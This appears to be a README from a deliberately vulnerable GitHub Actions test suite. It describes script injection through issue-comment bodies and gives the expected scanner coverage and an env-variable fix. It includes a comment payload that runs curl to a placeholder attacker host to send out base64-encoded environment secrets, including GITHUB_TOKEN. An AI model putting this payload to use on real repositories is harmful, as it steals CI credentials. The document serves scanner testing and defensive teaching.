# Scenario 33: Script injection via `github.event.comment.body`

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable workflow:** [`.github/workflows/scenario-33-script-injection-comment-body.yml`](../../.github/workflows/scenario-33-script-injection-comment-body.yml)

## What this variant probes

Same canonical bug as [scenario 02](../02-script-injection-issue-title/README.md)
— attacker-controlled `github.event.*` interpolated into a `run:` block
— but the untrusted context is the **issue-comment body**.

The `issue_comment` trigger fires on every new comment to every issue
and PR. On a public repository, anyone with a GitHub account can drive
this primitive — no fork, no PR, no commit required. The comment body
is plain user text, interpolated raw into the generated shell.

## How an attacker exploits it

1. Open an arbitrary issue (or find an existing one).
2. Post a comment containing:

   ```
   "; curl https://attacker.tld/$(env | base64) #
   ```

3. The workflow's `run: echo "Comment: ${{ github.event.comment.body }}"`
   step expands the body verbatim and runs the curl with the workflow's
   `GITHUB_TOKEN` and any other secrets visible in the env.

## Expected scanner coverage

Identical to scenario 02 — any scanner that names
`github.event.comment.body` (or `github.event.review.body` for the PR-
review variant) on its untrusted-input list should flag this.

## Fix

Same fix as scenario 02:

```yaml
- env:
    BODY: ${{ github.event.comment.body }}
  run: echo "Comment: $BODY"
```

## References

- [Scenario 02 — Script injection via issue title](../02-script-injection-issue-title/README.md)
  — full exploitation walkthrough applies here.
- [GitHub docs — Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
  ("Good practices for mitigating script injection attacks").
